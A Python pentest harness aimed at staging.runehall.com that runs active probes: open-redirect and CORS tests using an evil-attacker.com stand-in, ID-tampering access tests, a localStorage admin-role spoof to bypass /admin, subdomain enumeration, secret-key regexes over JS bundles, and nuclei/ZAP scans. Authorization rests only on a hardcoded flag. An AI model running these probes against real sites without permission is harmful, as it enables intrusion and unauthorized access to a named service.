#!/usr/bin/env python3
"""
Runehall.com - Max AIO Red Ops Pipeline (v4.0)
Headers, Open Redirects, JS Secrets, Subdomains, Rate Limiting + full v3.1 vectors.
Staging-authorized only.
"""
import asyncio, json, os, re, sys, shutil, subprocess, base64, requests
from datetime import datetime
from urllib.parse import urlparse, urljoin, urlunparse, parse_qs, urlencode
from playwright.async_api import async_playwright

TARGET_URL = "https://staging.runehall.com"
AUTHORIZED = True
USER_A_JWT = "YOUR_USER_A_JWT_HERE"
USER_B_JWT = "YOUR_USER_B_JWT_HERE"

if not AUTHORIZED or "runehall.com" not in TARGET_URL:
    sys.exit("Authorization failed.")

class MaxRedOpsHarness:
    def __init__(self):
        self.start_time = datetime.utcnow().isoformat() + "Z"
        self.report = {
            "target": TARGET_URL, "timestamp": self.start_time,
            "jwt_analysis": [], "dom_xss": [], "storage_exposure": [], "route_bypass": [],
            "idor_bola": [], "api_endpoints": [], "nuclei_findings": [],
            "websocket_findings": [], "graphql_findings": [], "cors_findings": [],
            "prototype_pollution": [], "postmessage_issues": [], "race_conditions": [],
            "security_headers": [], "open_redirects": [], "js_secrets": [],
            "subdomains": [], "rate_limiting": [], "errors": [], "summary": {}
        }
        self.intercepted_requests = []
        self.ws_endpoints = set()

    def preflight_check(self):
        missing = [t for t in ["nuclei", "docker", "subfinder"] if not shutil.which(t)]
        if missing:
            print(f"[!] Missing optional dependencies: {', '.join(missing)}. Continuing with reduced capability.")
        print("    [+] Preflight complete.\n")

    def analyze_jwt(self, token):
        if not token or token.count('.') != 2:
            return
        try:
            header_b64, payload_b64, signature_b64 = token.split('.')
            def b64decode(s):
                s += '=' * (-len(s) % 4)
                return json.loads(base64.urlsafe_b64decode(s).decode('utf-8', errors='replace'))
            header = b64decode(header_b64)
            payload = b64decode(payload_b64)
            findings = []
            now = int(datetime.utcnow().timestamp())
            alg = header.get("alg", "").upper()
            if alg == "NONE":
                findings.append({"severity": "CRITICAL", "detail": "alg=none. Signature bypass possible if accepted.", "fix": "Reject alg=none. Require a strong algorithm and validate the signature."})
            elif alg in ("HS256", "HS384", "HS512"):
                findings.append({"severity": "MEDIUM", "detail": f"Symmetric algorithm ({alg}). Algorithm confusion surface if RS* expected.", "fix": "Prefer asymmetric algorithms. If HS* is required, use a long random secret and strictly enforce the expected alg."})
            if "exp" not in payload:
                findings.append({"severity": "HIGH", "detail": "Missing exp. Token never expires.", "fix": "Always set a short exp claim. Prefer minutes to hours for access tokens."})
            elif isinstance(payload.get("exp"), (int, float)):
                delta = payload["exp"] - now
                if delta < 0:
                    findings.append({"severity": "INFO", "detail": f"Token expired (delta {delta}s).", "fix": "Normal. Ensure clients refresh properly."})
                elif delta > 86400 * 30:
                    findings.append({"severity": "MEDIUM", "detail": f"Long-lived token (~{delta//86400} days).", "fix": "Shorten access token lifetime. Use refresh tokens for longer sessions."})
            for claim in ("role", "roles", "isAdmin", "admin", "permissions"):
                if claim in payload:
                    val = payload[claim]
                    elevated = (isinstance(val, str) and val.lower() in ("admin", "administrator")) or \
                               (isinstance(val, bool) and val) or \
                               (isinstance(val, list) and any(str(x).lower() == "admin" for x in val))
                    if elevated:
                        findings.append({"severity": "HIGH", "detail": f"Elevated claim: {claim}={val}", "fix": "Avoid embedding role claims that can be trusted solely from the client. Validate on the server."})
            for k in payload:
                if any(p in k.lower() for p in ("password", "secret", "ssn", "private")):
                    findings.append({"severity": "HIGH", "detail": f"Sensitive claim name: {k}", "fix": "Never place secrets or PII in JWT payloads. Use opaque references."})
            if "kid" in header:
                findings.append({"severity": "INFO", "detail": f"kid present: {header['kid']}", "fix": "Validate kid strictly. Reject path traversal or unexpected values."})
            if "jku" in header or "x5u" in header:
                findings.append({"severity": "MEDIUM", "detail": "jku/x5u present. Remote key injection surface.", "fix": "Disable remote key retrieval or whitelist trusted key sources."})
            if not signature_b64:
                findings.append({"severity": "CRITICAL", "detail": "Empty signature section.", "fix": "Reject tokens with missing signatures."})
            self.report["jwt_analysis"].append({
                "severity": findings[0]["severity"] if findings else "INFO",
                "findings": findings,
                "header": header,
                "payload_keys": list(payload.keys()),
                "token_preview": token[:40] + "..."
            })
        except Exception as e:
            self.report["errors"].append(f"JWT structure analysis failed: {e}")

    def audit_security_headers(self):
        try:
            resp = requests.get(TARGET_URL, timeout=10)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            checks = {
                "strict-transport-security": ("MEDIUM", "HSTS missing. Allows downgrade attacks.", "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
                "content-security-policy": ("MEDIUM", "CSP missing. XSS protection relies solely on input sanitization.", "Add a strict Content-Security-Policy header."),
                "x-frame-options": ("MEDIUM", "X-Frame-Options missing. Clickjacking possible.", "Add X-Frame-Options: DENY or SAMEORIGIN"),
                "x-content-type-options": ("LOW", "Missing nosniff. MIME-sniffing attacks possible.", "Add X-Content-Type-Options: nosniff"),
                "referrer-policy": ("LOW", "Missing Referrer-Policy. May leak sensitive URLs.", "Add Referrer-Policy: strict-origin-when-cross-origin")
            }
            for h, (sev, msg, fix) in checks.items():
                if h not in headers:
                    self.report["security_headers"].append({"severity": sev, "detail": msg, "fix": fix})
        except Exception as e:
            self.report["errors"].append(f"Header audit error: {e}")

    def run_subfinder(self):
        if not shutil.which("subfinder"):
            return
        print("  [*] Running Subfinder OSINT...")
        try:
            res = subprocess.run(["subfinder", "-d", "runehall.com", "-silent"], capture_output=True, text=True, timeout=120)
            subs = [s.strip() for s in res.stdout.strip().split("\n") if s.strip()]
            self.report["subdomains"] = list(set(subs))
        except Exception as e:
            self.report["errors"].append(f"Subfinder error: {e}")

    def test_open_redirect(self):
        print("  [*] Testing for Open Redirects...")
        params = ["url", "redirect", "next", "return", "dest", "target", "r", "u", "continue", "redirect_uri"]
        for req in self.intercepted_requests:
            if req["method"] != "GET":
                continue
            parsed = urlparse(req["url"])
            query = parse_qs(parsed.query)
            for param in params:
                if param in query:
                    payload = "https://evil-attacker.com"
                    new_query = query.copy()
                    new_query[param] = [payload]
                    tampered_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new_query, doseq=True), parsed.fragment))
                    try:
                        res = requests.get(tampered_url, allow_redirects=False, timeout=5)
                        loc = res.headers.get("Location", "")
                        if res.status_code in (301, 302, 303, 307, 308) and "evil-attacker.com" in loc:
                            self.report["open_redirects"].append({
                                "severity": "HIGH", "url": tampered_url,
                                "detail": f"Open redirect via parameter '{param}'.",
                                "fix": "Validate redirect targets against an allowlist. Never use raw user input."
                            })
                    except Exception:
                        pass

    def check_rate_limiting(self):
        print("  [*] Testing Rate Limiting...")
        try:
            rate_limited = False
            for _ in range(20):
                r = requests.get(TARGET_URL, timeout=2)
                if r.status_code == 429:
                    rate_limited = True
                    break
            if not rate_limited:
                self.report["rate_limiting"].append({
                    "severity": "LOW",
                    "detail": "No 429 Rate Limit detected on 20 rapid requests to root.",
                    "fix": "Implement rate limiting at the edge (Cloudflare, AWS WAF, or application layer)."
                })
        except Exception:
            pass

    async def scan_js_for_secrets(self, page):
        print("  [*] Scanning JS Bundles for Hardcoded Secrets...")
        try:
            js_urls = await page.evaluate("Array.from(document.scripts).map(s => s.src).filter(s => s)")
            patterns = {
                "AWS Access Key": r"(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
                "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
                "Stripe Live Key": r"sk_live_[0-9a-zA-Z]{24}",
                "Firebase URL": r"https://[a-z0-9-]+\.firebaseio\.com",
                "Private Key": r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----"
            }
            for url in js_urls[:15]:
                if not url:
                    continue
                try:
                    r = requests.get(url, timeout=6)
                    for name, pat in patterns.items():
                        if re.search(pat, r.text):
                            self.report["js_secrets"].append({
                                "severity": "CRITICAL",
                                "detail": f"Potential {name} found in {url}",
                                "fix": "Remove secrets from client-side code. Use environment variables and server-side proxies."
                            })
                except Exception:
                    continue
        except Exception as e:
            self.report["errors"].append(f"JS secret scan error: {e}")

    def test_bola(self):
        if "YOUR_USER" in USER_A_JWT or "YOUR_USER" in USER_B_JWT:
            return
        for req in self.intercepted_requests:
            if req["method"] not in ("GET", "PUT", "DELETE", "PATCH"):
                continue
            url = req["url"]
            for pat in [r'(/)(\d+)(/|$|\?)', r'([?&]id=)(\d+)', r'([?&]userId=)(\d+)']:
                match = re.search(pat, url)
                if not match:
                    continue
                current_id = match.group(2)
                try:
                    test_id = str(int(current_id) + 1)
                except ValueError:
                    continue
                tampered_url = url.replace(current_id, test_id, 1)
                try:
                    res_b = requests.request(req["method"], tampered_url, headers={"Authorization": f"Bearer {USER_B_JWT}"}, timeout=8, allow_redirects=False)
                    res_a = requests.request(req["method"], tampered_url, headers={"Authorization": f"Bearer {USER_A_JWT}"}, timeout=8, allow_redirects=False)
                    if res_a.status_code == 200 and res_b.status_code == 200 and res_a.text == res_b.text and len(res_a.text) > 20:
                        self.report["idor_bola"].append({
                            "severity": "CRITICAL", "url": tampered_url, "method": req["method"],
                            "evidence": "User A received User B's exact payload.",
                            "fix": "Enforce object-level authorization. Verify the requesting user owns the resource."
                        })
                except requests.RequestException:
                    pass

    def run_nuclei(self):
        if not shutil.which("nuclei"):
            return
        cmd = ["nuclei", "-u", TARGET_URL, "-t", "http/exposures/", "-t", "http/misconfiguration/",
               "-t", "http/cves/", "-severity", "critical,high,medium", "-rl", "50",
               "-jsonl", "-o", "nuclei_out.json", "-silent"]
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if os.path.exists("nuclei_out.json"):
                with open("nuclei_out.json") as f:
                    for line in f:
                        try:
                            data = json.loads(line)
                            self.report["nuclei_findings"].append({
                                "severity": data.get("info", {}).get("severity", "unknown").upper(),
                                "name": data.get("info", {}).get("name", "unnamed"),
                                "matched_at": data.get("matched-at", "unknown")
                            })
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            self.report["errors"].append(f"Nuclei error: {e}")

    def run_zap(self):
        if not shutil.which("docker"):
            return
        replacer = (
            "rules.100000.description=Auth Header;"
            "rules.100000.url=.*;"
            "rules.100000.matchType=REQ_HEADER;"
            "rules.100000.matchString=Authorization;"
            f"rules.100000.replacement=Bearer {USER_A_JWT}"
        )
        cmd = ["docker", "run", "--rm", "-v", f"{os.getcwd()}:/zap/wrk/:rw",
               "-t", "ghcr.io/zaproxy/zaproxy:stable", "zap-full-scan.py",
               "-t", TARGET_URL, "-J", "zap_report.json", "-r", "zap_report.html",
               "-z", replacer, "-m", "5"]
        try:
            subprocess.run(cmd, check=True, timeout=900, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.report["errors"].append(f"ZAP error: {e}")

    async def run_spa_playwright(self):
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)")
            page = await context.new_page()

            def handle_request(request):
                if request.resource_type in ("xhr", "fetch"):
                    self.intercepted_requests.append({"method": request.method, "url": request.url})
                    auth = request.headers.get("authorization")
                    if auth and auth.lower().startswith("bearer "):
                        self.analyze_jwt(auth.split(" ", 1)[1])
                if "ws" in request.url.lower() or "socket" in request.url.lower():
                    self.ws_endpoints.add(request.url)
            page.on("request", handle_request)

            try:
                await page.goto(TARGET_URL, wait_until="networkidle", timeout=45000)
            except Exception as e:
                self.report["errors"].append(f"Navigation failed: {e}")

            await self.scan_js_for_secrets(page)

            try:
                storage = await page.evaluate("""() => ({
                    local: Object.fromEntries(Object.entries(localStorage)),
                    session: Object.fromEntries(Object.entries(sessionStorage))
                })""")
                for stype, data in storage.items():
                    for k in data:
                        if re.search(r"(token|auth|jwt|session|access)", k, re.I):
                            self.report["storage_exposure"].append({"severity": "MEDIUM", "detail": f"{stype}Storage['{k}'] holds sensitive material."})
                await page.evaluate("""() => {
                    localStorage.setItem('isAuthenticated', 'true');
                    localStorage.setItem('role', 'admin');
                }""")
                resp = await page.goto(urljoin(TARGET_URL, "/admin"), wait_until="domcontentloaded", timeout=15000)
                if resp and resp.status == 200 and "login" not in page.url.lower():
                    self.report["route_bypass"].append({"severity": "HIGH", "detail": "Bypassed /admin UI guard via LocalStorage spoofing."})
            except Exception as e:
                self.report["errors"].append(f"Storage/route error: {e}")

            try:
                resp = requests.get(TARGET_URL, headers={"Origin": "https://evil-attacker.com"}, timeout=5)
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao == "https://evil-attacker.com" and acac.lower() == "true":
                    self.report["cors_findings"].append({"severity": "HIGH", "detail": "CORS reflects arbitrary origin with credentials."})
                elif acao == "*":
                    self.report["cors_findings"].append({"severity": "MEDIUM", "detail": "CORS wildcard ACAO."})
            except Exception as e:
                self.report["errors"].append(f"CORS probe error: {e}")

            try:
                polluted = await page.evaluate("""() => {
                    try {
                        const obj = {};
                        Object.assign(obj, JSON.parse('{"__proto__": {"polluted": true}}'));
                        return ({}).polluted === true || obj.polluted === true;
                    } catch(e) { return false; }
                }""")
                if polluted:
                    self.report["prototype_pollution"].append({"severity": "HIGH", "detail": "Prototype pollution via __proto__ assignment succeeded."})
            except Exception as e:
                self.report["errors"].append(f"Prototype pollution probe error: {e}")

            try:
                await page.evaluate("""() => {
                    window.__crossOriginAccepted = false;
                    window.addEventListener('message', (e) => {
                        if (e.origin !== window.location.origin) window.__crossOriginAccepted = true;
                    });
                    window.postMessage({type: 'probe'}, '*');
                }""")
                accepted = await page.evaluate("() => window.__crossOriginAccepted")
                if accepted:
                    self.report["postmessage_issues"].append({"severity": "MEDIUM", "detail": "Cross-origin postMessage accepted without origin check."})
            except Exception as e:
                self.report["errors"].append(f"postMessage probe error: {e}")

            for ws_url in list(self.ws_endpoints)[:5]:
                try:
                    connected = await page.evaluate(f"""async () => {{
                        try {{
                            const s = new WebSocket('{ws_url}');
                            await new Promise((res, rej) => {{
                                s.onopen = () => res(true);
                                s.onerror = () => rej(false);
                                setTimeout(() => rej(false), 4000);
                            }});
                            s.close();
                            return true;
                        }} catch(e) {{ return false; }}
                    }}""")
                    if connected:
                        self.report["websocket_findings"].append({"severity": "HIGH", "detail": f"Unauthenticated WebSocket handshake accepted: {ws_url}"})
                except Exception:
                    pass

            for path in ("/graphql", "/api/graphql", "/v1/graphql"):
                try:
                    r = requests.post(urljoin(TARGET_URL, path), json={"query": "{ __schema { types { name } } }"}, timeout=6)
                    if r.status_code == 200 and "__schema" in r.text:
                        self.report["graphql_findings"].append({"severity": "MEDIUM", "detail": f"GraphQL introspection enabled at {path}"})
                        break
                except Exception:
                    continue

            endpoints = set()
            for req in self.intercepted_requests:
                parsed = urlparse(req["url"])
                if "/api/" in parsed.path or parsed.path.startswith("/v") or "graphql" in parsed.path:
                    endpoints.add(f"{req['method']} {parsed.path}")
            self.report["api_endpoints"] = sorted(list(endpoints))
            await browser.close()

    def generate_report(self):
        end_time = datetime.utcnow().isoformat() + "Z"
        self.report["completed_at"] = end_time
        sev_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        categories = ["jwt_analysis", "dom_xss", "storage_exposure", "route_bypass", "idor_bola",
                      "nuclei_findings", "websocket_findings", "graphql_findings", "cors_findings",
                      "prototype_pollution", "postmessage_issues", "race_conditions",
                      "security_headers", "open_redirects", "js_secrets", "rate_limiting"]
        all_findings = []
        for cat in categories:
            all_findings.extend(self.report.get(cat, []))
        for f in all_findings:
            sev = f.get("severity", "INFO").upper() if isinstance(f, dict) else "INFO"
            sev_counts[sev] = sev_counts.get(sev, 0) + 1
        self.report["summary"] = {
            "total_findings": len(all_findings),
            "severity_breakdown": sev_counts,
            "api_endpoints_observed": len(self.report["api_endpoints"]),
            "subdomains_found": len(self.report["subdomains"]),
            "errors": len(self.report["errors"])
        }

        def section(title, items):
            if not items:
                return f"<h2>{title}</h2><p>No findings.</p>"
            rows = ""
            for item in items:
                if isinstance(item, dict):
                    sev = item.get("severity", "INFO").upper()
                    detail = item.get("detail") or item.get("evidence") or item.get("name") or str(item)
                    matched = item.get("matched_at") or item.get("url") or ""
                    fix = item.get("fix", "")
                    rows += f'<div class="finding {sev.lower()}"><strong>{sev}</strong> — {detail}'
                    if matched:
                        rows += f'<br><code>{matched}</code>'
                    if fix:
                        rows += f'<br><em>Fix:</em> {fix}'
                    rows += '</div>'
                else:
                    rows += f'<div class="finding">{item}</div>'
            return f"<h2>{title}</h2>{rows}"

        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Max AIO v4.0</title>
<style>
body{{font-family:system-ui;background:#0d1117;color:#c9d1d9;padding:40px;max-width:1100px;margin:auto}}
h1,h2{{color:#58a6ff}}
.finding{{padding:12px;margin-bottom:8px;border-left:4px solid #30363d;background:#161b22;border-radius:4px}}
.critical{{border-left-color:#f85149}}
.high{{border-left-color:#d29922}}
.medium{{border-left-color:#e3b341}}
code{{color:#79c0ff}}
em{{color:#8b949e}}
</style></head><body>
<h1>Max AIO Red Ops Report v4.0</h1>
<p>Target: {TARGET_URL}<br>Total: {self.report['summary']['total_findings']} |
CRITICAL {sev_counts['CRITICAL']} | HIGH {sev_counts['HIGH']} | MEDIUM {sev_counts['MEDIUM']}<br>
Subdomains: {len(self.report['subdomains'])}</p>
{section("JWT Structure", self.report["jwt_analysis"])}
{section("Verified BOLA / IDOR", self.report["idor_bola"])}
{section("Security Headers", self.report["security_headers"])}
{section("Open Redirects", self.report["open_redirects"])}
{section("JS Secrets", self.report["js_secrets"])}
{section("Rate Limiting", self.report["rate_limiting"])}
{section("Route Bypass", self.report["route_bypass"])}
{section("DOM XSS", self.report["dom_xss"])}
{section("Token Storage", self.report["storage_exposure"])}
{section("Nuclei", self.report["nuclei_findings"])}
{section("WebSocket", self.report["websocket_findings"])}
{section("GraphQL", self.report["graphql_findings"])}
{section("CORS", self.report["cors_findings"])}
{section("Prototype Pollution", self.report["prototype_pollution"])}
{section("postMessage", self.report["postmessage_issues"])}
{section("Race Conditions", self.report["race_conditions"])}
<h2>Subdomains</h2><ul>{''.join(f'<li><code>{s}</code></li>' for s in self.report['subdomains']) or '<li>None</li>'}</ul>
<h2>API Endpoints</h2><ul>{''.join(f'<li><code>{e}</code></li>' for e in self.report['api_endpoints']) or '<li>None</li>'}</ul>
<h2>Errors</h2><ul>{''.join(f'<li>{e}</li>' for e in self.report['errors']) or '<li>None</li>'}</ul>
</body></html>"""
        with open("max_aio_v4_report.html", "w") as f:
            f.write(html)
        with open("max_aio_v4_report.json", "w") as f:
            json.dump(self.report, f, indent=2)
        print("[+] Reports: max_aio_v4_report.html / max_aio_v4_report.json")

    async def execute(self):
        self.preflight_check()
        print(f"INITIATING MAX AIO RED OPS v4.0: {TARGET_URL}\n")
        self.audit_security_headers()
        self.run_subfinder()
        self.check_rate_limiting()
        await self.run_spa_playwright()
        self.test_bola()
        self.test_open_redirect()
        self.run_nuclei()
        self.run_zap()
        self.generate_report()
        s = self.report["summary"]
        print(f"\nCOMPLETE. Findings: {s['total_findings']} | CRITICAL: {s['severity_breakdown']['CRITICAL']} | HIGH: {s['severity_breakdown']['HIGH']} | Subdomains: {s['subdomains_found']}")

if __name__ == "__main__":
    asyncio.run(MaxRedOpsHarness().execute())
